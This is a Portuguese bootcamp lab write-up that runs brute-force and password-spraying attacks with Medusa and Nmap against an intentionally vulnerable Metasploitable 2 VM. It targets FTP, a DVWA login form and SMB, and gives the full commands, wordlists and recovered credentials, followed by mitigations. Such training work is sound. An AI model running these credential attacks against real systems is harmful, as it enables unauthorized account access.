# :test_tube: Detalhes do projeto Bootcamp - Cibersegurança

## 📌 Sobre o Projeto

Este projeto faz parte do Bootcamp de **Cibersegurança** oferecido pela **DIO (Digital Innovation One)** em parceria com a **Riachuelo**, e tem como objetivo demonstrar, na prática, a execução de ataques de força bruta (Brute Force) em um ambiente controlado utilizando:

- **Kali Linux** (Host do hacker)
- **Metasploitable 2** (Estação de aplicações)
- **Ferramenta Medusa** (Ferramenta do kali usada neste Lab)

Foram explorados três aplicações principais:

- :card_index_dividers: **FTP** (Servidor de compartilhamento de arquivos pela rede/internet)
- 🌐 **Aplicação Web (DVWA)** (Explorando pagina de login/formulário)
- 💻 **SMB** (password spraying)

---

## 🎯 Objetivos

- Compreender ataques de força bruta em diferentes serviços
- Utilizar ferramentas de pentest (Medusa e Nmap)
- Explorar vulnerabilidades em ambientes inseguros
- Documentar processos técnicos de forma estruturada
- Praticar segurança ofensiva em laboratório

---

## 🖥️ Ambiente Utilizado

| Componente | Descrição |
|---|---|
| **Sistema Atacante** | Kali Linux |
| **Sistema Alvo** | Metasploitable 2 |
| **Virtualização** | VirtualBox |
| **Rede** | Host-Only |

---

## ⚙️ Configuração do Ambiente

### 🖥️ Máquinas Virtuais

O laboratório foi montado utilizando o VirtualBox para isolar o tráfego de ataque.

![Ambiente VirtualBox](images/01.virtualbox.png)
*Configuração das máquinas no VirtualBox — Metasploitable e Kali Linux em execução simultânea*

![Kali Linux no VirtualBox](images/04.virtualbox-kalilinux.png)
*Interface do Kali Linux pronto para o ataque*

---

### 🔐 Inicialização do Metasploitable

A máquina alvo é um servidor intencionalmente vulnerável.

![Login Metasploitable](images/02.metasploitable-login.png)
*Tela de boot do Metasploitable 2 com aviso de uso exclusivo em redes confiáveis*

**Credenciais padrão:** `msfadmin` / `msfadmin`

---

### 🌐 Identificação do IP

Comando utilizado para localizar o alvo na rede local:

```bash
ip a
```

![IP da máquina alvo](images/03.metasploitable-ip.png)
*Endereço IP identificado no Metasploitable via comando `ip a`*

**IP utilizado no laboratório:** `192.168.56.101`

---

## 🔎 Enumeração

### ✔️ Teste de Conectividade

Antes de iniciar os ataques, foi realizado um teste para validar a comunicação entre as máquinas:

```bash
ping -c 3 192.168.56.101
```

![Teste de ping](images/05.testeconexao-ping-kalilinux.png)
*Ping bem-sucedido confirmando comunicação entre Kali Linux e Metasploitable*

### ✔️ Varredura de Serviços com Nmap

```bash
nmap -sV -p 21,22,80,445,139 192.168.56.101
```

![Serviços ativos](images/06.servicosativos.png)
*Resultado da varredura Nmap — serviços FTP, SSH, HTTP e SMB identificados*

Serviços identificados:

| Porta | Serviço | Versão |
|---|---|---|
| 21/tcp | FTP | vsftpd 2.3.4 |
| 22/tcp | SSH | OpenSSH 4.7p1 |
| 80/tcp | HTTP | Apache httpd 2.2.8 |
| 139/tcp | NetBIOS-SSN | Samba smbd 3.X – 4.X |
| 445/tcp | NetBIOS-SSN | Samba smbd 3.X – 4.X |

---

## 🔐 Ataque 1: Força Bruta em FTP

### ✔️ Criação das Wordlists

Foram criadas listas simples de usuários e senhas para simular o ataque:

```bash
echo -e "user\nadmin\nmsfadmin\nroot" > users.txt
echo -e "123456\npassword\nmsfadmin\nadmin" > pass.txt
```

![Criação das wordlists](images/07.criacaodaslistas.png)
*Criação dos arquivos `users.txt` e `pass.txt` utilizados no ataque*

### ✔️ Execução do Ataque com Medusa

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

![Ataque FTP com Medusa](images/08.ataquemedusalista.png)
*Medusa testando combinações de usuários e senhas no serviço FTP*

### ✔️ Resultado

O ataque identificou credenciais válidas:

- **Usuário:** `msfadmin`
- **Senha:** `msfadmin`

### ✔️ Validação de Acesso

```bash
ftp 192.168.56.101
```

![Confirmação de acesso FTP](images/09.confirmacaoconexaomedusalistas.png)
*Acesso autenticado com sucesso via FTP utilizando as credenciais descobertas*

---

## 🌐 Ataque 2: Força Bruta em Aplicação Web (DVWA)

### ✔️ Acesso à Aplicação

A aplicação vulnerável DVWA foi acessada pelo navegador:

```
http://192.168.56.101/dvwa/login.php
```

![Tela de login DVWA](images/11.formulariodvwa.png)
*Formulário de login da aplicação DVWA acessado via navegador no Kali Linux*

### ✔️ Execução do Ataque com Medusa

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m FAIL='Login failed' -t 6
```

![Ataque web com Medusa](images/10.acessodvwa.png)
*Ataque automatizado no formulário de login — múltiplas credenciais válidas encontradas*

### ✔️ Resultado

Foram encontradas múltiplas credenciais válidas (`user`, `admin`, `msfadmin`, `root`), demonstrando a ausência de mecanismos de proteção contra ataques de força bruta na aplicação.

---

## 💻 Ataque 3: Password Spraying em SMB

### ✔️ Criação das Listas

```bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

### ✔️ Execução do Ataque

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

![Password spraying SMB](images/12.passwordsprayngcommedusa.png)
*Execução de password spraying no serviço SMB — acesso de administrador confirmado*

### ✔️ Resultado

Credenciais válidas identificadas:

- **Usuário:** `msfadmin`
- **Senha:** `msfadmin`
- **Nível de acesso:** `ADMIN$` (Access Allowed)

---

## 🛡️ Mitigações de Segurança

### 🔐 FTP
- Desativar login anônimo
- Limitar tentativas de autenticação (rate limiting)
- Substituir por SFTP/FTPS e utilizar senhas fortes

### 🌐 Aplicações Web
- Implementar CAPTCHA após tentativas falhas
- Bloquear ou retardar múltiplas tentativas de login
- Utilizar autenticação multifator (MFA)

### 💻 SMB
- Aplicar políticas de senha robustas
- Implementar bloqueio de conta após tentativas inválidas
- Monitorar logs e alertar sobre tentativas suspeitas de acesso

---

## 📚 Conclusão

Este laboratório demonstrou como sistemas com configurações inseguras e senhas fracas podem ser comprometidos facilmente através de ataques automatizados.

A utilização da ferramenta **Medusa** evidenciou a importância de controles de segurança adequados, como limitação de tentativas, políticas de senha robustas e monitoramento contínuo — especialmente em serviços amplamente expostos como FTP, HTTP e SMB.

---

## 🧰 Ferramentas Utilizadas

- [Kali Linux](https://www.kali.org/)
- [Medusa](http://foofus.net/goons/jmk/medusa/medusa.html)
- [Nmap](https://nmap.org/)
- [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [DVWA](https://dvwa.co.uk/)
- [VirtualBox](https://www.virtualbox.org/)

---

## ⚠️ Aviso Legal

> Este projeto foi desenvolvido **exclusivamente para fins educacionais** em ambiente controlado e isolado.
>
> **Não utilize essas técnicas em sistemas reais sem autorização prévia.** O uso não autorizado dessas ferramentas pode constituir crime previsto na legislação vigente.